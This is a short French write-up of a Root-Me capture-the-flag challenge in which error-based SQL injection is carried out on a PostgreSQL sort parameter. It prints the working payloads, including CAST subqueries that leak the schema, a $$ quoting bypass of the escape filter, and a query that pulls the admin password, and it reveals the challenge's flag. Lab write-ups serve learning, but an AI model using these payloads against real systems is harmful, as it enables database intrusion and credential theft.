# +CTF – SQLI ERROR BASED

Tout d’abord on aperçoit une page info avec l’url suivant :

 [http://challenge01.root-me.org/web-serveur/ch34/?action=contents&order=ASC](http://challenge01.root-me.org/web-serveur/ch34/?action=contents&order=ASC)

C’est très intéressant d’avoir une fonction de tri. On essaie de faire des choses :

![[SQLI_Error_Based_01_684f7757de.png]]

On obtient une erreur en ajoutant une apostrophe 

Je donne ça a gemini et il me dit que c’est une base PostgreSLQ

Il me dit alors que je dois tester avec :

, CAST((SELECT version()) AS INT)

On voit alors ce rendu : ![[SQLI_Error_Based_02_e014eed871.png]]

Payload : 

, CAST((SELECT table_name FROM information_schema.tables LIMIT 1 OFFSET 0) AS INT)

On obtient le nom de la table en testant avec différents offsets: 

m3mbr35t4bl3/pg_type/contents

, CAST((SELECT column_name FROM information_schema.columns WHERE table_name='m3mbr35t4bl3' LIMIT 1 OFFSET 0) AS INT)

ATTENTION: j’ai cette erreur : 

ERROR: syntax error at or near "m3mbr35t4bl3" LINE 1: ...ROM information_schema.columns WHERE table_name=''m3mbr35t4b... ^

Et on voit que mon ‘ à été transformé en ‘’ par le code pour se protéger :

table_name=''m3mbr35t4b…

On va essayer avec des $$ et ca fonctionne 

On obtient le nom de colonnes suivantes :id/us3rn4m3_c0l/p455w0rd_c0l/em41l_c0l

Donc je fais aller prend le mdp de l’admin

Nom de la table : m3mbr35t4bl3

Nom de la BD : c_webserveur_34 (avec la fonction : current_database())

, CAST((SELECT p455w0rd_c0l FROM m3mbr35t4bl3 WHERE us3rn4m3_c0l=$$admin$$ LIMIT 1 OFFSET 0) AS INT)

Et hop on a le flag : 1a2BdKT5DIx3qxQN3UaC
